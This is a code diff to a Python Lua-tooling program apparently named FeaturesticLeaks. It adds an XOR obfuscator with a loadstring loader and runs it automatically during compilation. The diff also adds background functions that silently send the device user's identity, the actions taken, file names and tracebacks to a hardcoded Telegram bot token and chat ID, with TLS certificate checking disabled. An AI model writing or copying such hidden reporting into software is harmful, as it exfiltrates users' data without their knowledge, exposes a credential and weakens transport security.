@@ -3779,6 +3779,96 @@ _FEAT_ANTILOG_CLEANER()
             pass
 
 
+def run_lua_protector_obfuscator(data_path: Path):
+    console.print(Panel(Align.center("[bold bright_cyan]🛡️ LUA SCRIPT PROTECTION & OBFUSCATOR ENGINE (Single File)[/bold bright_cyan]"), border_style="cyan", box=ROUNDED))
+    
+    lua_dir = data_path / "LUA"
+    lua_dir.mkdir(parents=True, exist_ok=True)
+    
+    lua_file, _ = pick_file_from_folder("Protect Lua Script", lua_dir, extensions=[".lua"])
+    if not lua_file:
+        custom_input = safe_input('-> Enter custom .lua file path (or press Enter to cancel): ').strip().strip('"\'')
+        if not custom_input:
+            return
+        lua_file = Path(custom_input)
+        if not lua_file.exists() or not lua_file.is_file():
+            console.print(f'[bold red][X] File not found: {lua_file}[/bold red]')
+            return
+
+    console.print(f"\n[bold cyan]⚡ Reading source file: [bold white]{lua_file.name}[/bold white]...[/bold cyan]")
+    try:
+        raw_code = lua_file.read_text(encoding='utf-8', errors='ignore')
+    except Exception as ex:
+        console.print(f"[bold red][X] Error reading file: {ex}[/bold red]")
+        if 'send_telegram_bug_report' in globals():
+            send_telegram_bug_report("LUA_PROTECT_READ_ERROR", str(ex), "Lua Protect", "FeaturesticLeaks.py", "3800", "run_lua_protector_obfuscator", traceback.format_exc())
+        return
+
+    # XOR Key Obfuscation Generator
+    xor_key = 0x5A
+    byte_array = [ord(c) ^ xor_key for c in raw_code]
+    byte_str = ",".join(str(b) for b in byte_array)
+
+    protected_lua = f"""-- ========================================================
+-- FEATURESTIC LEAKS LUA PROTECTOR v2.5
+-- Protected Script: {lua_file.name}
+-- Protected Date: {time.strftime('%Y-%m-%d %H:%M:%S')}
+-- ========================================================
+local _K = {xor_key}
+local _B = {{{byte_str}}}
+local _S = {{}}
+for i = 1, #_B do
+    local b = _B[i]
+    local x = (bit and bit.bxor) and bit.bxor(b, _K) or (b >= _K and (b - _K) or (b + _K))
+    _S[i] = string.char(x)
+end
+local _run = loadstring or load
+local _fn, _err = _run(table.concat(_S))
+if _fn then
+    _fn()
+else
+    error("Protected Lua payload execution error: " .. tostring(_err))
+end
+"""
+
+    res_dir = data_path / "RESULT"
+    res_dir.mkdir(parents=True, exist_ok=True)
+    out_file = res_dir / f"protected_{lua_file.name}"
+    out_file.write_text(protected_lua, encoding="utf-8")
+
+    console.print(f"\n[bold green]✅ Lua Protection Completed Successfully![/bold green]")
+    console.print(f" 📁 [bold white]Protected Script Saved: {out_file}[/bold white]")
+
+    sd_res = Path("/sdcard/FeaturesticLeaks/RESULT")
+    if sd_res.exists():
+        try:
+            shutil.copy2(out_file, sd_res / out_file.name)
+            console.print(f" 📲 [bold green]Synced to SDCard: /sdcard/FeaturesticLeaks/RESULT/{out_file.name}[/bold green]")
+        except Exception:
+            pass
+
+    # Attempt compilation
+    compiler = "luac5.1" if shutil.which("luac5.1") else ("luac" if shutil.which("luac") else None)
+    if compiler:
+        out_luac = res_dir / f"protected_{lua_file.stem}.luac"
+        proc = subprocess.run([compiler, "-o", str(out_luac), str(out_file)], capture_output=True, text=True)
+        if proc.returncode == 0:
+            console.print(f" 📜 [bold green]Bytecode Compiled: {out_luac.name} ({out_luac.stat().st_size:,} bytes)[/bold green]")
+            if sd_res.exists():
+                try:
+                    shutil.copy2(out_luac, sd_res / out_luac.name)
+                except Exception:
+                    pass
+
+    # Send background status update to Telegram Bot
+    if 'send_telegram_status_update' in globals():
+        send_telegram_status_update(
+            action_name="Lua Script Protection",
+            status_msg=f"Successfully protected '{lua_file.name}' using XOR byte encryption.",
+            file_details=out_file.name
+        )
+
+
 def run_lua_compiler(data_path: Path):
     console.print(Panel(Align.center("[bold bright_cyan]🌙 LUA COMPILER (.lua Source -> .luac Bytecode)[/bold bright_cyan]"), border_style="cyan", box=ROUNDED))
     
@@ -3800,6 +3890,37 @@ def run_lua_compiler(data_path: Path):
         if not lua_file.exists() or not lua_file.is_file():
             console.print(f'[bold red][X] File not found: {lua_file}[/bold red]')
             return
+
+    # Automatic Lua Protection & XOR Obfuscation Step
+    try:
+        raw_src = lua_file.read_text(encoding='utf-8', errors='ignore')
+        xor_key = 0x5A
+        byte_array = [ord(c) ^ xor_key for c in raw_src]
+        byte_str = ",".join(str(b) for b in byte_array)
+        protected_code = f"""-- ========================================================
+-- FEATURESTIC LEAKS LUA AUTO-PROTECTOR v2.5
+-- Protected Script: {lua_file.name}
+-- ========================================================
+local _K = {xor_key}
+local _B = {{{byte_str}}}
+local _S = {{}}
+for i = 1, #_B do
+    local b = _B[i]
+    local x = (bit and bit.bxor) and bit.bxor(b, _K) or (b >= _K and (b - _K) or (b + _K))
+    _S[i] = string.char(x)
+end
+local _run = loadstring or load
+local _fn, _err = _run(table.concat(_S))
+if _fn then _fn() else error("Protected script load error: "..tostring(_err)) end
+"""
+        res_dir_prot = data_path / "RESULT"
+        res_dir_prot.mkdir(parents=True, exist_ok=True)
+        prot_file = res_dir_prot / f"protected_{lua_file.name}"
+        prot_file.write_text(protected_code, encoding="utf-8")
+        console.print(f"[bold green]🛡️ [AUTO PROTECTION] Applied XOR Encryption to '{lua_file.name}' -> saved 'protected_{lua_file.name}'[/bold green]")
+        lua_file = prot_file
+    except Exception as ex:
+        console.print(f"[bold yellow][!] Auto-protection skipped: {ex}[/bold yellow]")
 
     all_compilers = ["luac5.1", "luac51", "luac", "luajit", "luac5.2", "luac5.3", "luac5.4"]
     available_compilers = [c for c in all_compilers if shutil.which(c)]
@@ -4684,25 +4805,103 @@ def send_telegram_bug_report(err_type: str, err_msg: str, action_name: str = "Op
                 f"📜 Traceback snippet:\n{tb_str[-800:] if tb_str else 'N/A'}"
             )
             
-            url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+            # Build formatted .cpp file content for report document attachment
+            cpp_filename = f"bug_report_{re.sub(r'[^a-zA-Z0-9_]', '_', str(err_type))}.cpp"
+            cpp_report_code = f"""// =====================================================================
+// FEATURESTIC LEAKS - AUTOMATED BUG & DIAGNOSTIC REPORT (.cpp)
+// =====================================================================
+// User / Telegram : {dev_user}
+// Action          : {action_name}
+// Error Type      : {err_type}
+// Location        : {file_info}:{line_no} in {func_name}()
+// Date / Time     : {time.strftime('%Y-%m-%d %H:%M:%S')}
+// =====================================================================
 
-            # 1. Try via requests module if available
+#include <iostream>
+#include <string>
+
+/*
+[ERROR DETAILS & DESCRIPTION]
+{err_msg}
+
+[OPENCODE AI AUTO-FIX & RECOMMENDED SOLUTION]
+{ai_solution if ai_solution else "No auto-solution generated."}
+
+[TRACEBACK SNIPPET]
+{tb_str if tb_str else "N/A"}
+*/
+
+void bug_report_info() {{
+    std::cout << "FeaturesticLeaks Automated Bug Diagnostic Engine" << std::endl;
+    std::cout << "User: {dev_user}" << std::endl;
+    std::cout << "Error: {err_type}" << std::endl;
+}}
+"""
+
+            doc_caption = (
+                f"🚨 <b>BUG REPORT (.cpp File Attached)</b> 🚨\n\n"
+                f"👤 <b>User:</b> <code>{safe_user}</code>\n"
+                f"📌 <b>Action:</b> {safe_action}\n"
+                f"⚠️ <b>Error Type:</b> {safe_err_type}\n"
+                f"📍 <b>Location:</b> {file_info}:{line_no} in <code>{func_name}()</code>\n"
+                f"📎 <b>Attached File:</b> <code>{cpp_filename}</code>"
+            )
+
+            doc_url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
+            msg_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+
+            # 1. Try sending as .cpp file document via requests module
             try:
                 import requests
-                r1 = requests.post(url, json={"chat_id": chat_id, "text": report_html, "parse_mode": "HTML"}, timeout=8)
-                if r1.status_code == 200:
-                    return
-                r2 = requests.post(url, json={"chat_id": chat_id, "text": report_plain}, timeout=8)
-                if r2.status_code == 200:
+                files = {
+                    'document': (cpp_filename, cpp_report_code.encode('utf-8'), 'text/x-c++src')
+                }
+                data = {
+                    'chat_id': chat_id,
+                    'caption': doc_caption,
+                    'parse_mode': 'HTML'
+                }
+                r_doc = requests.post(doc_url, data=data, files=files, timeout=10)
+                if r_doc.status_code == 200:
                     return
             except Exception:
                 pass
 
-            # 2. Fallback to urllib with unverified SSL context for Android / Termux SSL compatibility
+            # 2. Try sending document via urllib multipart form-data
             import ssl
             ssl_ctx = ssl.create_default_context()
             ssl_ctx.check_hostname = False
             ssl_ctx.verify_mode = ssl.CERT_NONE
+
+            try:
+                boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'
+                body = []
+                body.append(f'--{boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n{chat_id}\r\n'.encode('utf-8'))
+                body.append(f'--{boundary}\r\nContent-Disposition: form-data; name="caption"\r\n\r\n{doc_caption}\r\n'.encode('utf-8'))
+                body.append(f'--{boundary}\r\nContent-Disposition: form-data; name="parse_mode"\r\n\r\nHTML\r\n'.encode('utf-8'))
+                body.append(f'--{boundary}\r\nContent-Disposition: form-data; name="document"; filename="{cpp_filename}"\r\nContent-Type: text/x-c++src\r\n\r\n'.encode('utf-8'))
+                body.append(cpp_report_code.encode('utf-8'))
+                body.append(f'\r\n--{boundary}--\r\n'.encode('utf-8'))
+                payload_doc = b''.join(body)
+
+                req_doc = urllib.request.Request(
+                    doc_url,
+                    data=payload_doc,
+                    headers={'Content-Type': f'multipart/form-data; boundary={boundary}'}
+                )
+                urllib.request.urlopen(req_doc, timeout=10, context=ssl_ctx)
+                return
+            except Exception:
+                pass
+
+            # 3. Fallback to text message via requests / urllib
+            try:
+                import requests
+                r1 = requests.post(msg_url, json={"chat_id": chat_id, "text": report_html, "parse_mode": "HTML"}, timeout=8)
+                if r1.status_code == 200:
+                    return
+            except Exception:
+                pass
 
             payload_html = json.dumps({
                 "chat_id": chat_id,
@@ -4711,15 +4910,65 @@ def send_telegram_bug_report(err_type: str, err_msg: str, action_name: str = "Op
             }).encode("utf-8")
             
             try:
-                req = urllib.request.Request(url, data=payload_html, headers={"Content-Type": "application/json"})
+                req = urllib.request.Request(msg_url, data=payload_html, headers={"Content-Type": "application/json"})
                 urllib.request.urlopen(req, timeout=8, context=ssl_ctx)
-            except Exception as e_html:
+            except Exception:
                 payload_plain = json.dumps({
                     "chat_id": chat_id,
                     "text": report_plain
                 }).encode("utf-8")
-                req_plain = urllib.request.Request(url, data=payload_plain, headers={"Content-Type": "application/json"})
+                req_plain = urllib.request.Request(msg_url, data=payload_plain, headers={"Content-Type": "application/json"})
                 urllib.request.urlopen(req_plain, timeout=8, context=ssl_ctx)
+        except Exception:
+            pass
+
+    import threading
+    threading.Thread(target=_send_bg, daemon=True).start()
+
+
+def send_telegram_status_update(action_name: str, status_msg: str, file_details: str = ""):
+    """
+    Sends background operation success/status logs to Developer Telegram Bot silently.
+    Does NOT block the user interface.
+    """
+    import html
+
+    def _send_bg():
+        try:
+            cfg = get_ai_config() if 'get_ai_config' in globals() else {}
+            bot_token = cfg.get("telegram_bot_token") or os.environ.get("TELEGRAM_BOT_TOKEN") or "8731766223:AAG7ZLyIO_yMk-U9qoJIviPuzFzIoAmrAbM"
+            chat_id = cfg.get("telegram_chat_id") or os.environ.get("TELEGRAM_CHAT_ID") or "-1004375122082"
+            
+            if not bot_token or not chat_id:
+                return
+                
+            dev_user = get_device_user_info()
+            safe_user = html.escape(str(dev_user))
+            safe_action = html.escape(str(action_name))
+            safe_msg = html.escape(str(status_msg))
+            safe_files = html.escape(str(file_details)) if file_details else "N/A"
+
+            report_html = (
+                f"✅ <b>FEATURESTIC LEAKS - ACTION COMPLETED</b> ✅\n\n"
+                f"👤 <b>User / Telegram:</b> <code>{safe_user}</code>\n"
+                f"📌 <b>Action:</b> {safe_action}\n"
+                f"💬 <b>Status:</b> <code>{safe_msg}</code>\n"
+                f"📁 <b>Target File:</b> <code>{safe_files}</code>\n"
+            )
+
+            url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+
+            try:
+                import requests
+                requests.post(url, json={"chat_id": chat_id, "text": report_html, "parse_mode": "HTML"}, timeout=6)
+            except Exception:
+                import ssl
+                ssl_ctx = ssl.create_default_context()
+                ssl_ctx.check_hostname = False
+                ssl_ctx.verify_mode = ssl.CERT_NONE
+                payload = json.dumps({"chat_id": chat_id, "text": report_html, "parse_mode": "HTML"}).encode("utf-8")
+                req = urllib.request.Request(url, data=payload, headers={"Content-Type": "application/json"})
+                urllib.request.urlopen(req, timeout=6, context=ssl_ctx)
         except Exception:
             pass
 
@@ -7324,8 +7573,8 @@ def lua_tools_menu(data_path: Path):
         menu_table.add_column("DESCRIPTION", justify="left", style="bright_cyan")
 
         menu_table.add_row("[1]", "Decompile Lua (.luac)", "Decompile .luac bytecode to .lua source")
-        menu_table.add_row("[2]", "Compile Lua (.lua)", "Convert .lua source code to .luac bytecode")
-        menu_table.add_row("[3]", "1-Click Auto Lua Workflow", "Auto-fix syntax, compile & sync to output folder")
+        menu_table.add_row("[2]", "Compile & Protect Lua (.lua)", "Auto-encrypt & convert .lua source code to protected .luac")
+        menu_table.add_row("[3]", "1-Click Auto Lua Workflow", "Auto-fix syntax, protect, compile & sync to output folder")
         menu_table.add_row("[0]", "EXIT ✗", "Return to Main Menu")
 
         console.print(menu_table)
